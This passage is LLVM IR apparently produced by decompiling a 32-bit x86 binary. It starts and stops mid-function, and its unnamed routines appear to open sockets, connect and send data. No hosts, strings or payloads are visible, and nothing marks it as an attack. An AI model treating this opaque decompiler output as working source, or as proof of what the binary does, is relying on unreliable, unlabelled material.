  store i32 %v1_80518e4, i32* %eax.global-to-local, align 4
  %v12_80518e7 = icmp eq i32 %v1_80518e3, %v0_80518c6
  br i1 %v12_80518e7, label %dec_label_pc_80519d1.loopexit, label %dec_label_pc_80518ef

dec_label_pc_80518ef:                             ; preds = %dec_label_pc_80518e3, %dec_label_pc_80518da
  %v0_80518e3 = phi i32 [ %v1_80518e3, %dec_label_pc_80518e3 ], [ 0, %dec_label_pc_80518da ]
  %v0_80518e4 = phi i32 [ %v1_80518e4, %dec_label_pc_80518e3 ], [ %v0_80518da, %dec_label_pc_80518da ]
  %v3_80518ef = add i32 %v0_80518e4, 8
  %v4_80518ef = inttoptr i32 %v3_80518ef to i16*
  %v5_80518ef = load i16, i16* %v4_80518ef, align 2
  %v11_80518ef = icmp ult i16 %v1_80518ef, %v5_80518ef
  br i1 %v11_80518ef, label %dec_label_pc_80518e3, label %dec_label_pc_80518f5

dec_label_pc_80518f5:                             ; preds = %dec_label_pc_80518ef
  %v3_80518f5 = add i32 %v0_80518e4, 10
  %v4_80518f5 = inttoptr i32 %v3_80518f5 to i16*
  %v5_80518f5 = load i16, i16* %v4_80518f5, align 2
  %v11_80518f5 = icmp ult i16 %v1_80518ef, %v5_80518f5
  %v1_80518f9 = icmp eq i1 %v11_80518f5, false
  br i1 %v1_80518f9, label %dec_label_pc_80518e3, label %dec_label_pc_80518fb.loopexit

dec_label_pc_80518fb.loopexit:                    ; preds = %dec_label_pc_80518f5
  br label %dec_label_pc_80518fb

dec_label_pc_80518fb:                             ; preds = %dec_label_pc_80518fb.loopexit, %dec_label_pc_80519d1
  %v0_80518fe = phi i32 [ %v0_80518e4, %dec_label_pc_80518fb.loopexit ], [ 0, %dec_label_pc_80519d1 ]
  %v0_80518fb = load i32, i32* @edi, align 4
  %v1_80518fb = add i32 %v0_80518fb, 4
  %v2_80518fb = inttoptr i32 %v1_80518fb to i32*
  %v3_80518fb = load i32, i32* %v2_80518fb, align 4
  store i32 %v3_80518fb, i32* %ecx.global-to-local, align 4
  %v2_80518fe = inttoptr i32 %v0_80518fb to i32*
  store i32 %v0_80518fe, i32* %v2_80518fe, align 4
  %v0_8051900 = load i32, i32* @edi, align 4
  %v1_8051900 = add i32 %v0_8051900, 24
  %v2_8051900 = inttoptr i32 %v1_8051900 to i32*
  store i32 0, i32* %v2_8051900, align 4
  %v0_8050f04.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8050f0c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050f04

dec_label_pc_805190c:                             ; preds = %dec_label_pc_805186b
  %v0_805190f = load i32, i32* @edi, align 4
  %v1_805190f = add i32 %v0_805190f, 4
  %v2_805190f = inttoptr i32 %v1_805190f to i32*
  %v3_805190f = load i32, i32* %v2_805190f, align 4
  store i32 %v3_805190f, i32* %eax.global-to-local, align 4
  %v2_8051912 = add i32 %v0_80518a1, 16
  %v3_8051912 = inttoptr i32 %v2_8051912 to i32*
  store i32 %v3_805190f, i32* %v3_8051912, align 4
  %v1_8051913 = call i32 @function_8052b81(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051913, i32* %eax.global-to-local, align 4
  %v0_805191b = load i32, i32* @edi, align 4
  %v1_805191b = add i32 %v0_805191b, 4
  %v2_805191b = inttoptr i32 %v1_805191b to i32*
  store i32 -1, i32* %v2_805191b, align 4
  %v0_8051922 = load i32, i32* @edi, align 4
  %v1_8051922 = add i32 %v0_8051922, 284
  %v2_8051922 = inttoptr i32 %v1_8051922 to i8*
  store i8 0, i8* %v2_8051922, align 1
  %v0_8051929 = load i32, i32* @edi, align 4
  %v1_8051929 = add i32 %v0_8051929, 12
  %v2_8051929 = inttoptr i32 %v1_8051929 to i32*
  store i32 0, i32* %v2_8051929, align 4
  br label %dec_label_pc_8050f1b

dec_label_pc_8051935:                             ; preds = %dec_label_pc_8050e38
  %v3_8051940 = add nuw nsw i32 %v2_8051940, 1572
  %v4_8051940 = add i32 %v3_8051940, %v0_8051940
  %v5_8051940 = inttoptr i32 %v4_8051940 to i32*
  %v6_8051940 = load i32, i32* %v5_8051940, align 4
  %v9_8051940 = shl i32 1, %v1_805193a
  %v12_8051940 = or i32 %v6_8051940, %v9_8051940
  store i32 %v12_8051940, i32* %v5_8051940, align 4
  %v0_8051948 = load i32, i32* @ebx, align 4
  %v1_8051948 = add i32 %v0_8051948, 4
  %v2_8051948 = inttoptr i32 %v1_8051948 to i32*
  %v3_8051948 = load i32, i32* %v2_8051948, align 4
  store i32 %v3_8051948, i32* %eax.global-to-local, align 4
  %v0_805194b = load i32, i32* @esi, align 4
  %v2_805194b = sub i32 %v0_805194b, %v3_8051948
  %v8_805194b = xor i32 %v0_805194b, %v3_8051948
  %v9_805194b = xor i32 %v2_805194b, %v0_805194b
  %v10_805194b = and i32 %v9_805194b, %v8_805194b
  %v11_805194b = icmp slt i32 %v10_805194b, 0
  %v13_805194b = icmp slt i32 %v2_805194b, 0
  %v2_805194d = icmp eq i1 %v13_805194b, %v11_805194b
  br i1 %v2_805194d, label %dec_label_pc_8050e5b, label %dec_label_pc_8051953

dec_label_pc_8051953:                             ; preds = %dec_label_pc_8051935
  store i32 %v3_8051948, i32* @esi, align 4
  br label %dec_label_pc_8050e5b

dec_label_pc_8051960:                             ; preds = %dec_label_pc_8050e26
  %v0_8051960 = load i32, i32* @esp, align 4
  %v1_8051963 = add i32 %v2_8050e18, 4
  %v2_8051963 = inttoptr i32 %v1_8051963 to i32*
  %v3_8051963 = load i32, i32* %v2_8051963, align 4
  store i32 %v3_8051963, i32* %edx.global-to-local, align 4
  %v2_8051966 = add i32 %v0_8051960, -16
  %v3_8051966 = inttoptr i32 %v2_8051966 to i32*
  store i32 %v3_8051963, i32* %v3_8051966, align 4
  %v1_8051967 = call i32 @function_8052b81(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051967, i32* %eax.global-to-local, align 4
  %v0_805196f = load i32, i32* @ebx, align 4
  %v1_805196f = add i32 %v0_805196f, 4
  %v2_805196f = inttoptr i32 %v1_805196f to i32*
  store i32 -1, i32* %v2_805196f, align 4
  %v0_8051976 = load i32, i32* @ebx, align 4
  %v1_8051976 = add i32 %v0_8051976, 12
  %v2_8051976 = inttoptr i32 %v1_8051976 to i32*
  %v3_8051976 = load i32, i32* %v2_8051976, align 4
  %tmp301 = icmp ult i32 %v3_8051976, 3
  br i1 %tmp301, label %dec_label_pc_80519af, label %dec_label_pc_805197c

dec_label_pc_805197c:                             ; preds = %dec_label_pc_8051960
  %v1_805197c = add i32 %v0_8051976, 284
  %v2_805197c = inttoptr i32 %v1_805197c to i8*
  %v3_805197c = load i8, i8* %v2_805197c, align 1
  %v4_805197c = zext i8 %v3_805197c to i32
  %v6_805197c = and i32 %v1_8051967, -256
  %v7_805197c = or i32 %v4_805197c, %v6_805197c
  %v1_8051982 = add i32 %v7_805197c, 1
  %v10_8051982 = trunc i32 %v1_8051982 to i8
  store i32 %v1_8051982, i32* %eax.global-to-local, align 4
  store i8 %v10_8051982, i8* %v2_805197c, align 1
  %v0_8051989 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051989 = trunc i32 %v0_8051989 to i8
  %v10_8051989 = icmp eq i8 %v1_8051989, 10
  %v0_80519af.pre = load i32, i32* @ebx, align 4
  br i1 %v10_8051989, label %dec_label_pc_80519af, label %dec_label_pc_805198d

dec_label_pc_805198d:                             ; preds = %dec_label_pc_805197c
  store i32 %v0_80519af.pre, i32* @eax, align 4
  %v0_805198f = call i32 @function_8050190()
  store i32 %v0_805198f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050e5b

dec_label_pc_80519a0:                             ; preds = %dec_label_pc_80517e1
  %v0_80519a0 = load i32, i32* @edi, align 4
  store i32 %v0_80519a0, i32* @eax, align 4
  store i32 -1, i32* @ebp, align 4
  %v0_80519a5 = call i32 @function_8050190()
  store i32 %v0_80519a5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80512e1

dec_label_pc_80519af:                             ; preds = %dec_label_pc_805197c, %dec_label_pc_8051960
  %v0_80519af = phi i32 [ %v0_8051976, %dec_label_pc_8051960 ], [ %v0_80519af.pre, %dec_label_pc_805197c ]
  %v1_80519af = add i32 %v0_80519af, 284
  %v2_80519af = inttoptr i32 %v1_80519af to i8*
  store i8 0, i8* %v2_80519af, align 1
  %v0_80519b6 = load i32, i32* @ebx, align 4
  %v1_80519b6 = add i32 %v0_80519b6, 12
  %v2_80519b6 = inttoptr i32 %v1_80519b6 to i32*
  store i32 0, i32* %v2_80519b6, align 4
  br label %dec_label_pc_8050e5b

dec_label_pc_80519c2:                             ; preds = %dec_label_pc_8050e08
  br i1 %v5_8050e1d, label %dec_label_pc_8050e5b, label %dec_label_pc_80519ca

dec_label_pc_80519ca:                             ; preds = %dec_label_pc_80519c2
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050e26

dec_label_pc_80519d1.loopexit:                    ; preds = %dec_label_pc_80518e3
  br label %dec_label_pc_80519d1

dec_label_pc_80519d1:                             ; preds = %dec_label_pc_80519d1.loopexit, %dec_label_pc_80518ad
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80518fb

dec_label_pc_80519d8:                             ; preds = %dec_label_pc_80514cc
  %v1_80519d8 = add i32 %v0_8050fb7, 56
  %v2_80519d8 = inttoptr i32 %v1_80519d8 to i32*
  %v3_80519d8 = load i32, i32* %v2_80519d8, align 4
  store i32 %v3_80519d8, i32* %eax.global-to-local, align 4
  %v1_80519dc = inttoptr i32 %v3_80519d8 to i32*
  store i32 104, i32* %v1_80519dc, align 4
  %v0_80514e8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80514e8

dec_label_pc_80519e7:                             ; preds = %dec_label_pc_80514e8
  store i32 %v0_80519e7, i32* @eax, align 4
  %v0_80519e9 = call i32 @function_8050190()
  store i32 %v0_80519e9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f1b

dec_label_pc_80519f3:                             ; preds = %dec_label_pc_805149e
  %v11_80519f3 = icmp eq i8 %v2_805149e, -5
  %v1_80519f5 = icmp eq i1 %v11_80519f3, false
  br i1 %v1_80519f5, label %dec_label_pc_805102d, label %dec_label_pc_80519fb

dec_label_pc_80519fb:                             ; preds = %dec_label_pc_80519f3
  store i8 -3, i8* %v1_805149e, align 1
  %v4_805102d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805102d

dec_label_pc_8051a1e:                             ; preds = %dec_label_pc_805129c
  %v1_8051a1e = add i32 %v0_80512b7, 1
  %v8_8051a1e = icmp eq i32 %v1_8051a1e, 0
  store i32 %v1_8051a1e, i32* %eax.global-to-local, align 4
  br i1 %v8_8051a1e, label %dec_label_pc_80512c4, label %dec_label_pc_8051a25

dec_label_pc_8051a25:                             ; preds = %dec_label_pc_8051a1e
  %v0_8051a25 = load i32, i32* @ecx, align 4
  %v1_8051a25 = load i32, i32* @esp, align 4
  %v2_8051a25 = add i32 %v1_8051a25, -4
  %v3_8051a25 = inttoptr i32 %v2_8051a25 to i32*
  store i32 %v0_8051a25, i32* %v3_8051a25, align 4
  %v1_8051a26 = add i32 %v1_8051a25, -8
  %v2_8051a26 = inttoptr i32 %v1_8051a26 to i32*
  store i32 0, i32* %v2_8051a26, align 4
  %v1_8051a28 = add i32 %v1_8051a25, -12
  %v2_8051a28 = inttoptr i32 %v1_8051a28 to i32*
  store i32 1, i32* %v2_8051a28, align 4
  %v1_8051a2a = add i32 %v1_8051a25, -16
  %v2_8051a2a = inttoptr i32 %v1_8051a2a to i32*
  store i32 2, i32* %v2_8051a2a, align 4
  %v3_8051a2c = call i32 @function_8053375(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_8051a31 = load i32, i32* @esp, align 4
  %v2_8051a31 = add i32 %v1_8051a31, 48
  %v3_8051a31 = inttoptr i32 %v2_8051a31 to i32*
  store i32 %v3_8051a2c, i32* %v3_8051a31, align 4
  %v0_8051a35 = load i32, i32* @esp, align 4
  %v1_8051a38 = add i32 %v3_8051a2c, 1
  %v8_8051a38 = icmp eq i32 %v1_8051a38, 0
  store i32 %v1_8051a38, i32* @eax, align 4
  %v2_8050c7e = inttoptr i32 %v0_8051a35 to i32*
  br i1 %v8_8051a38, label %dec_label_pc_8050c7b, label %dec_label_pc_8051a3f

dec_label_pc_8051a3f:                             ; preds = %dec_label_pc_8051a25
  store i32 18, i32* %v2_8050c7e, align 4
  %v2_8051a44 = call i32 @function_8051c90(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051a44, i32* %eax.global-to-local, align 4
  %v0_8051a49 = load i32, i32* @esp, align 4
  %v1_8051a49 = inttoptr i32 %v0_8051a49 to i32*
  store i32 19, i32* %v1_8051a49, align 4
  %v2_8051a50 = call i32 @function_8051c90(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051a50, i32* %eax.global-to-local, align 4
  %v0_8051a55 = load i32, i32* @esp, align 4
  %v1_8051a55 = inttoptr i32 %v0_8051a55 to i32*
  %v2_8051a55 = load i32, i32* %v1_8051a55, align 4
  store i32 %v2_8051a55, i32* %eax.global-to-local, align 4
  %v3_8051a55 = add i32 %v0_8051a55, 4
  %v1_8051a56 = inttoptr i32 %v3_8051a55 to i32*
  %v2_8051a56 = load i32, i32* %v1_8051a56, align 4
  store i32 %v2_8051a56, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8051a56, align 4
  store i32 18, i32* %v1_8051a55, align 4
  %v3_8051a5b = call i32 @function_8051be0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8051a5b, i32* %eax.global-to-local, align 4
  %v1_8051a60 = load i32, i32* @esp, align 4
  %v2_8051a60 = inttoptr i32 %v1_8051a60 to i32*
  store i32 %v3_8051a5b, i32* %v2_8051a60, align 4
  %v2_8051a63 = call i32 @function_804fcd0(i8* bitcast (i32* @0 to i8*))
  store i32 %v2_8051a63, i32* %eax.global-to-local, align 4
  %v0_8051a68 = load i32, i32* @esp, align 4
  store i32 %v2_8051a63, i32* @esi, align 4
  %v2_8051a6d = icmp eq i32 %v2_8051a63, 0
  br i1 %v2_8051a6d, label %dec_label_pc_80512c4, label %dec_label_pc_8051a75

dec_label_pc_8051a75:                             ; preds = %dec_label_pc_8051a3f
  %v1_8051a75 = add i32 %v0_8051a68, 1844
  %v2_8051a75 = inttoptr i32 %v1_8051a75 to i16*
  store i16 2, i16* %v2_8051a75, align 2
  %v2_8051a7f = add i32 %v2_8051a63, 4
  %v3_8051a7f = inttoptr i32 %v2_8051a7f to i32*
  %v4_8051a7f = load i32, i32* %v3_8051a7f, align 4
  store i32 %v4_8051a7f, i32* @ebx, align 4
  %v1_8051a82 = call i32 @function_804fa00(i32 ptrtoint (i32* @0 to i32))
  %v2_8051a82 = sext i32 %v1_8051a82 to i64
  store i32 %v1_8051a82, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8051a89 = load i32, i32* @esi, align 4
  %v1_8051a89 = inttoptr i32 %v0_8051a89 to i8*
  %v2_8051a89 = load i8, i8* %v1_8051a89, align 1
  %v3_8051a89 = zext i8 %v2_8051a89 to i32
  store i32 %v3_8051a89, i32* %ecx.global-to-local, align 4
  %v8_8051a8f = zext i8 %v2_8051a89 to i64
  %v9_8051a8f = udiv i64 %v2_8051a82, %v8_8051a8f
  %v10_8051a8f = trunc i64 %v9_8051a8f to i32
  store i32 %v10_8051a8f, i32* %eax.global-to-local, align 4
  %v11_8051a8f = urem i64 %v2_8051a82, %v8_8051a8f
  %v12_8051a8f = trunc i64 %v11_8051a8f to i32
  store i32 %v12_8051a8f, i32* %edx.global-to-local, align 4
  %v0_8051a91 = load i32, i32* @ebx, align 4
  %v2_8051a91 = mul nuw nsw i32 %v12_8051a8f, 4
  %v3_8051a91 = add i32 %v2_8051a91, %v0_8051a91
  %v4_8051a91 = inttoptr i32 %v3_8051a91 to i32*
  %v5_8051a91 = load i32, i32* %v4_8051a91, align 4
  store i32 %v5_8051a91, i32* %eax.global-to-local, align 4
  %v1_8051a94 = load i32, i32* @esp, align 4
  %v2_8051a94 = add i32 %v1_8051a94, 1832
  %v3_8051a94 = inttoptr i32 %v2_8051a94 to i32*
  store i32 %v5_8051a91, i32* %v3_8051a94, align 4
  %v0_8051a9b = load i32, i32* @edi, align 4
  %v1_8051a9b = load i32, i32* @esp, align 4
  %v2_8051a9b = add i32 %v1_8051a9b, -4
  %v3_8051a9b = inttoptr i32 %v2_8051a9b to i32*
  store i32 %v0_8051a9b, i32* %v3_8051a9b, align 4
  %v0_8051a9c = load i32, i32* @edi, align 4
  %v2_8051a9c = add i32 %v1_8051a9b, -8
  %v3_8051a9c = inttoptr i32 %v2_8051a9c to i32*
  store i32 %v0_8051a9c, i32* %v3_8051a9c, align 4
  %v1_8051a9d = add i32 %v1_8051a9b, -12
  %v2_8051a9d = inttoptr i32 %v1_8051a9d to i32*
  store i32 0, i32* %v2_8051a9d, align 4
  %v1_8051a9f = add i32 %v1_8051a9b, -16
  %v2_8051a9f = inttoptr i32 %v1_8051a9f to i32*
  store i32 19, i32* %v2_8051a9f, align 4
  %v3_8051aa1 = call i32 @function_8051be0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  %v4_8051aa1 = inttoptr i32 %v3_8051aa1 to i16*
  store i32 %v3_8051aa1, i32* %eax.global-to-local, align 4
  %v3_8051aa6 = load i16, i16* %v4_8051aa1, align 2
  %v4_8051aa6 = zext i16 %v3_8051aa6 to i32
  %v7_8051aa6 = and i32 %v3_8051aa1, -65536
  %v8_8051aa6 = or i32 %v4_8051aa6, %v7_8051aa6
  store i32 %v8_8051aa6, i32* %eax.global-to-local, align 4
  %v0_8051aa9 = load i32, i32* @esi, align 4
  %v1_8051aa9 = load i32, i32* @esp, align 4
  %v2_8051aa9 = inttoptr i32 %v1_8051aa9 to i32*
  store i32 %v0_8051aa9, i32* %v2_8051aa9, align 4
  %v0_8051aac = load i32, i32* %eax.global-to-local, align 4
  %v1_8051aac = trunc i32 %v0_8051aac to i16
  %v2_8051aac = load i32, i32* @esp, align 4
  %v3_8051aac = add i32 %v2_8051aac, 1846
  %v4_8051aac = inttoptr i32 %v3_8051aac to i16*
  store i16 %v1_8051aac, i16* %v4_8051aac, align 2
  %v1_8051ab4 = call i32 @function_804fc90(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051ab4, i32* %eax.global-to-local, align 4
  %v0_8051ab9 = load i32, i32* @esp, align 4
  %v1_8051ab9 = inttoptr i32 %v0_8051ab9 to i32*
  store i32 18, i32* %v1_8051ab9, align 4
  %v2_8051ac0 = call i32 @function_8051c10(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051ac0, i32* %eax.global-to-local, align 4
  %v0_8051ac5 = load i32, i32* @esp, align 4
  %v1_8051ac5 = inttoptr i32 %v0_8051ac5 to i32*
  store i32 19, i32* %v1_8051ac5, align 4
  %v2_8051acc = call i32 @function_8051c10(i8 ptrtoint (i32* @0 to i8))
  %v0_8051ad1 = load i32, i32* @esp, align 4
  %v1_8051ad1 = add i32 %v0_8051ad1, 1844
  store i32 %v1_8051ad1, i32* %eax.global-to-local, align 4
  %v1_8051adb = add i32 %v0_8051ad1, 8
  %v2_8051adb = inttoptr i32 %v1_8051adb to i32*
  store i32 16, i32* %v2_8051adb, align 4
  %v0_8051add = load i32, i32* %eax.global-to-local, align 4
  %v2_8051add = add i32 %v0_8051ad1, 4
  %v3_8051add = inttoptr i32 %v2_8051add to i32*
  store i32 %v0_8051add, i32* %v3_8051add, align 4
  %v1_8051ade = add i32 %v0_8051ad1, 48
  %v2_8051ade = inttoptr i32 %v1_8051ade to i32*
  %v3_8051ade = load i32, i32* %v2_8051ade, align 4
  store i32 %v3_8051ade, i32* %esi.global-to-local, align 4
  %v3_8051ae2 = inttoptr i32 %v0_8051ad1 to i32*
  store i32 %v3_8051ade, i32* %v3_8051ae2, align 4
  %v3_8051ae3 = call i32 @function_805319a(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8051ae8 = load i32, i32* @esp, align 4
  %v1_8051ae8 = add i32 %v0_8051ae8, 16
  %v1_8051aeb = add i32 %v3_8051ae3, 1
  %v8_8051aeb = icmp eq i32 %v1_8051aeb, 0
  store i32 %v1_8051aeb, i32* %eax.global-to-local, align 4
  %v1_8051aec = icmp eq i1 %v8_8051aeb, false
  br i1 %v1_8051aec, label %dec_label_pc_8051b07, label %dec_label_pc_8051aee

dec_label_pc_8051aee:                             ; preds = %dec_label_pc_8051a75
  br label %dec_label_pc_8051af1

dec_label_pc_8051af1:                             ; preds = %dec_label_pc_8051b07, %dec_label_pc_8051aee
  %storemerge4.in = phi i32 [ %v0_8051ae8, %dec_label_pc_8051aee ], [ %v0_8051bce, %dec_label_pc_8051b07 ]
  %v1_8051af1 = add i32 %storemerge4.in, 48
  %v2_8051af1 = inttoptr i32 %v1_8051af1 to i32*
  %v3_8051af1 = load i32, i32* %v2_8051af1, align 4
  store i32 %v3_8051af1, i32* @edi, align 4
  %v3_8051af5 = inttoptr i32 %storemerge4.in to i32*
  store i32 %v3_8051af1, i32* %v3_8051af5, align 4
  %v1_8051af6 = call i32 @function_8052b81(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051af6, i32* @eax, align 4
  %v0_8051afb = load i32, i32* @esp, align 4
  %v1_8051afb = inttoptr i32 %v0_8051afb to i32*
  store i32 0, i32* %v1_8051afb, align 4
  %v1_8051b02 = call i32 @function_80546c9(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051b02, i32* %eax.global-to-local, align 4
  %v0_8051b07.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051b07

dec_label_pc_8051b07:                             ; preds = %dec_label_pc_8051a75, %dec_label_pc_8051af1
  %v0_8051b07 = phi i32 [ %v1_8051ae8, %dec_label_pc_8051a75 ], [ %v0_8051b07.pre, %dec_label_pc_8051af1 ]
  %v1_8051b07 = add i32 %v0_8051b07, 1864
  %v2_8051b07 = inttoptr i32 %v1_8051b07 to i8*
  store i8 0, i8* %v2_8051b07, align 1
  %v0_8051b0f = load i32, i32* @esp, align 4
  %v1_8051b0f = add i32 %v0_8051b0f, -4
  %v2_8051b0f = inttoptr i32 %v1_8051b0f to i32*
  store i32 16384, i32* %v2_8051b0f, align 4
  %v1_8051b14 = add i32 %v0_8051b0f, -8
  %v2_8051b14 = inttoptr i32 %v1_8051b14 to i32*
  store i32 1, i32* %v2_8051b14, align 4
  %v1_8051b16 = add i32 %v0_8051b0f, 1864
  store i32 %v1_8051b16, i32* %eax.global-to-local, align 4
  %v2_8051b1d = add i32 %v0_8051b0f, -12
  %v3_8051b1d = inttoptr i32 %v2_8051b1d to i32*
  store i32 %v1_8051b16, i32* %v3_8051b1d, align 4
  %v1_8051b1e = add i32 %v0_8051b0f, 32
  %v2_8051b1e = inttoptr i32 %v1_8051b1e to i32*
  %v3_8051b1e = load i32, i32* %v2_8051b1e, align 4
  store i32 %v3_8051b1e, i32* @ebx, align 4
  %v2_8051b22 = add i32 %v0_8051b0f, -16
  %v3_8051b22 = inttoptr i32 %v2_8051b22 to i32*
  store i32 %v3_8051b1e, i32* %v3_8051b22, align 4
  %v0_8051b23 = call i32 @function_80532c4()
  %v0_8051b28 = load i32, i32* @esp, align 4
  %v1_8051b28 = add i32 %v0_8051b28, -4
  %v2_8051b28 = inttoptr i32 %v1_8051b28 to i32*
  store i32 16384, i32* %v2_8051b28, align 4
  %v1_8051b2d = add i32 %v0_8051b28, -8
  %v2_8051b2d = inttoptr i32 %v1_8051b2d to i32*
  store i32 4, i32* %v2_8051b2d, align 4
  %v1_8051b2f = add i32 %v0_8051b28, 1888
  store i32 %v1_8051b2f, i32* %eax.global-to-local, align 4
  %v2_8051b36 = add i32 %v0_8051b28, -12
  %v3_8051b36 = inttoptr i32 %v2_8051b36 to i32*
  store i32 %v1_8051b2f, i32* %v3_8051b36, align 4
  %v1_8051b37 = add i32 %v0_8051b28, 48
  %v2_8051b37 = inttoptr i32 %v1_8051b37 to i32*
  %v3_8051b37 = load i32, i32* %v2_8051b37, align 4
  store i32 %v3_8051b37, i32* %ecx.global-to-local, align 4
  %v2_8051b3b = add i32 %v0_8051b28, -16
  %v3_8051b3b = inttoptr i32 %v2_8051b3b to i32*
  store i32 %v3_8051b37, i32* %v3_8051b3b, align 4
  %v0_8051b3c = call i32 @function_80532c4()
  %v0_8051b41 = load i32, i32* @esp, align 4
  %v1_8051b44 = add i32 %v0_8051b41, 28
  %v2_8051b44 = inttoptr i32 %v1_8051b44 to i32*
  store i32 16384, i32* %v2_8051b44, align 4
  %v1_8051b49 = add i32 %v0_8051b41, 24
  %v2_8051b49 = inttoptr i32 %v1_8051b49 to i32*
  store i32 2, i32* %v2_8051b49, align 4
  %v1_8051b4b = add i32 %v0_8051b41, 1914
  store i32 %v1_8051b4b, i32* %eax.global-to-local, align 4
  %v2_8051b52 = add i32 %v0_8051b41, 20
  %v3_8051b52 = inttoptr i32 %v2_8051b52 to i32*
  store i32 %v1_8051b4b, i32* %v3_8051b52, align 4
  %v1_8051b53 = add i32 %v0_8051b41, 64
  %v2_8051b53 = inttoptr i32 %v1_8051b53 to i32*
  %v3_8051b53 = load i32, i32* %v2_8051b53, align 4
  store i32 %v3_8051b53, i32* %edx.global-to-local, align 4
  %v2_8051b57 = add i32 %v0_8051b41, 16
  %v3_8051b57 = inttoptr i32 %v2_8051b57 to i32*
  store i32 %v3_8051b53, i32* %v3_8051b57, align 4
  %v0_8051b58 = call i32 @function_80532c4()
  store i32 %v0_8051b58, i32* %eax.global-to-local, align 4
  %v0_8051b5d = load i32, i32* @esp, align 4
  %v1_8051b5d = add i32 %v0_8051b5d, -4
  %v2_8051b5d = inttoptr i32 %v1_8051b5d to i32*
  store i32 16384, i32* %v2_8051b5d, align 4
  %v1_8051b62 = add i32 %v0_8051b5d, -8
  %v2_8051b62 = inttoptr i32 %v1_8051b62 to i32*
  store i32 1, i32* %v2_8051b62, align 4
  %v1_8051b64 = add i32 %v0_8051b5d, 52
  %v2_8051b64 = inttoptr i32 %v1_8051b64 to i32*
  %v3_8051b64 = load i32, i32* %v2_8051b64, align 4
  %v1_8051b68 = add i32 %v3_8051b64, 12
  store i32 %v1_8051b68, i32* %eax.global-to-local, align 4
  %v2_8051b6b = add i32 %v0_8051b5d, -12
  %v3_8051b6b = inttoptr i32 %v2_8051b6b to i32*
  store i32 %v1_8051b68, i32* %v3_8051b6b, align 4
  %v1_8051b6c = add i32 %v0_8051b5d, 48
  %v2_8051b6c = inttoptr i32 %v1_8051b6c to i32*
  %v3_8051b6c = load i32, i32* %v2_8051b6c, align 4
  store i32 %v3_8051b6c, i32* %eax.global-to-local, align 4
  %v2_8051b70 = add i32 %v0_8051b5d, -16
  %v3_8051b70 = inttoptr i32 %v2_8051b70 to i32*
  store i32 %v3_8051b6c, i32* %v3_8051b70, align 4
  %v0_8051b71 = call i32 @function_80532c4()
  %v0_8051b76 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8051b7b = add i32 %v0_8051b76, 28
  %v2_8051b7b = inttoptr i32 %v1_8051b7b to i32*
  store i32 16384, i32* %v2_8051b7b, align 4
  %v1_8051b80 = add i32 %v0_8051b76, 68
  %v2_8051b80 = inttoptr i32 %v1_8051b80 to i32*
  %v3_8051b80 = load i32, i32* %v2_8051b80, align 4
  store i32 %v3_8051b80, i32* %edx.global-to-local, align 4
  %v1_8051b84 = add i32 %v3_8051b80, 12
  %v2_8051b84 = inttoptr i32 %v1_8051b84 to i8*
  %v3_8051b84 = load i8, i8* %v2_8051b84, align 1
  %v4_8051b84 = zext i8 %v3_8051b84 to i32
  %v5_8051b84 = load i32, i32* %eax.global-to-local, align 4
  %v6_8051b84 = and i32 %v5_8051b84, -256
  %v7_8051b84 = or i32 %v6_8051b84, %v4_8051b84
  store i32 %v7_8051b84, i32* %eax.global-to-local, align 4
  %v2_8051b87 = add i32 %v0_8051b76, 24
  %v3_8051b87 = inttoptr i32 %v2_8051b87 to i32*
  store i32 %v7_8051b84, i32* %v3_8051b87, align 4
  %v0_8051b88 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051b88 = inttoptr i32 %v0_8051b88 to i32*
  %v2_8051b88 = load i32, i32* %v1_8051b88, align 4
  store i32 %v2_8051b88, i32* %eax.global-to-local, align 4
  %v2_8051b8a = add i32 %v0_8051b76, 20
  %v3_8051b8a = inttoptr i32 %v2_8051b8a to i32*
  store i32 %v2_8051b88, i32* %v3_8051b8a, align 4
  %v1_8051b8b = add i32 %v0_8051b76, 64
  %v2_8051b8b = inttoptr i32 %v1_8051b8b to i32*
  %v3_8051b8b = load i32, i32* %v2_8051b8b, align 4
  store i32 %v3_8051b8b, i32* %eax.global-to-local, align 4
  %v2_8051b8f = add i32 %v0_8051b76, 16
  %v3_8051b8f = inttoptr i32 %v2_8051b8f to i32*
  store i32 %v3_8051b8b, i32* %v3_8051b8f, align 4
  %v0_8051b90 = call i32 @function_80532c4()
  store i32 %v0_8051b90, i32* %eax.global-to-local, align 4
  %v0_8051b95 = load i32, i32* @esp, align 4
  %v1_8051b95 = add i32 %v0_8051b95, -4
  %v2_8051b95 = inttoptr i32 %v1_8051b95 to i32*
  store i32 16384, i32* %v2_8051b95, align 4
  %v1_8051b9a = add i32 %v0_8051b95, -8
  %v2_8051b9a = inttoptr i32 %v1_8051b9a to i32*
  store i32 1, i32* %v2_8051b9a, align 4
  %v1_8051b9c = add i32 %v0_8051b95, 52
